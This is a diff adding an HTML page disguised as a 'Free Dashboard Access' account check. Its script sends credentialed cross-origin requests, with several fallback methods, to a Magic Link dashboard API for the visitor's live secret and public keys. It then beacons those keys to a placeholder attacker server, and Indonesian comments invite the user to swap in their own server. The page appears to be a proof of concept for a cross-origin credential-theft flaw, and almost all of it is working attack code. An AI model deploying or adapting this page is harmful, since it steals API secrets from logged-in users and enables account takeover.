@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Free Dashboard Access</title>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f5f5f5; }
+    .container { background: white; padding: 30px; border-radius: 10px; max-width: 600px; margin: 0 auto; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+    .hidden { display: none; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>🔐 Verifying your account...</h1>
+    <div id="status">Processing...</div>
+    <div id="result" class="hidden"></div>
+  </div>
+
+  <script>
+    var webhook = 'https://attacker-server.com/collect'; // Ganti dengan server Anda
+
+    // === METHOD 1: XMLHttpRequest with all headers ===
+    function method1() {
+      return new Promise((resolve, reject) => {
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'https://api.dashboard.magic.link/v1/magic_client_api_key', true);
+        xhr.withCredentials = true;
+        xhr.setRequestHeader('X-Magic-Client-Id', 'bhBTGltjjSFfaxBOdn6QksvCChrQ59oWSVFEn6-rns4=');
+        xhr.setRequestHeader('X-Magic-Csrf', '');
+        xhr.setRequestHeader('Origin', 'https://evil.com');
+        
+        xhr.onload = function() {
+          if (xhr.status === 200) {
+            try {
+              resolve(JSON.parse(xhr.responseText));
+            } catch(e) {
+              reject('Parse error: ' + e);
+            }
+          } else {
+            reject('Status: ' + xhr.status);
+          }
+        };
+        xhr.onerror = function() {
+          reject('Network error');
+        };
+        xhr.send();
+      });
+    }
+
+    // === METHOD 2: Fetch API with mode no-cors (blind) ===
+    function method2() {
+      return fetch('https://api.dashboard.magic.link/v1/magic_client_api_key', {
+        method: 'GET',
+        credentials: 'include',
+        mode: 'cors',
+        headers: {
+          'X-Magic-Client-Id': 'bhBTGltjjSFfaxBOdn6QksvCChrQ59oWSVFEn6-rns4=',
+          'X-Magic-Csrf': '',
+          'Origin': 'https://evil.com'
+        }
+      })
+      .then(r => r.json())
+      .catch(e => { throw e; });
+    }
+
+    // === METHOD 3: jQuery AJAX fallback ===
+    function method3() {
+      return new Promise((resolve, reject) => {
+        var script = document.createElement('script');
+        script.src = 'https://code.jquery.com/jquery-3.7.1.min.js';
+        script.onload = function() {
+          $.ajax({
+            url: 'https://api.dashboard.magic.link/v1/magic_client_api_key',
+            method: 'GET',
+            xhrFields: { withCredentials: true },
+            headers: {
+              'X-Magic-Client-Id': 'bhBTGltjjSFfaxBOdn6QksvCChrQ59oWSVFEn6-rns4=',
+              'X-Magic-Csrf': '',
+              'Origin': 'https://evil.com'
+            },
+            success: function(data) { resolve(data); },
+            error: function(xhr, status, err) { reject(status + ': ' + err); }
+          });
+        };
+        script.onerror = function() { reject('jQuery load failed'); };
+        document.head.appendChild(script);
+      });
+    }
+
+    // === Exfiltration function ===
+    function exfiltrate(data) {
+      // Via Image beacon
+      var img = new Image();
+      img.src = webhook + '?sk=' + encodeURIComponent(data.live_secret_key) + 
+                '&pk=' + encodeURIComponent(data.live_public_key) +
+                '&id=' + encodeURIComponent(data.id) + '&t=' + Date.now();
+
+      // Via navigator.sendBeacon
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon(webhook, JSON.stringify({
+          secret_key: data.live_secret_key,
+          public_key: data.live_public_key,
+          id: data.id,
+          method: 'sendBeacon'
+        }));
+      }
+
+      // Tampilkan hasil
+      document.getElementById('status').innerHTML = '✅ Keys retrieved!';
+      document.getElementById('result').innerHTML = `
+        <div style="background:#ffebee; border:2px solid #c62828; padding:20px; border-radius:8px; margin-top:20px;">
+          <h3 style="color:#c62828;">🔑 Exposed Credentials</h3>
+          <p><strong>Live Secret Key:</strong><br>
+          <code style="background:#c62828; color:white; padding:5px 10px; display:inline-block; margin-top:5px; word-break:break-all;">${data.live_secret_key}</code></p>
+          <p><strong>Live Public Key:</strong><br>
+          <code style="background:#333; color:#0f0; padding:5px 10px; display:inline-block; margin-top:5px; word-break:break-all;">${data.live_public_key}</code></p>
+          <p><strong>ID:</strong> ${data.id}</p>
+          <p><small>Keys telah dikirim ke server attacker</small></p>
+        </div>
+      `;
+      document.getElementById('result').classList.remove('hidden');
+    }
+
+    // === Run all methods sequentially ===
+    async function run() {
+      const methods = [method1, method2, method3];
+      
+      for (let i = 0; i < methods.length; i++) {
+        try {
+          document.getElementById('status').textContent = `Trying method ${i + 1}...`;
+          let data = await methods[i]();
+          if (data && data.live_secret_key) {
+            exfiltrate(data);
+            return;
+          }
+        } catch(e) {
+          console.log(`Method ${i + 1} failed:`, e);
+        }
+      }
+      
+      document.getElementById('status').innerHTML = `
+        ❌ All methods failed.<br>
+        <small>Mungkin session sudah expired. Buka dashboard Magic Link dulu, refresh, baru buka halaman ini lagi.</small>
+        <br><br>
+        <button onclick="run()" style="padding:10px 20px; cursor:pointer;">🔄 Coba Lagi</button>
+      `;
+    }
+
+    run();
+  </script>
+</body>
+</html>
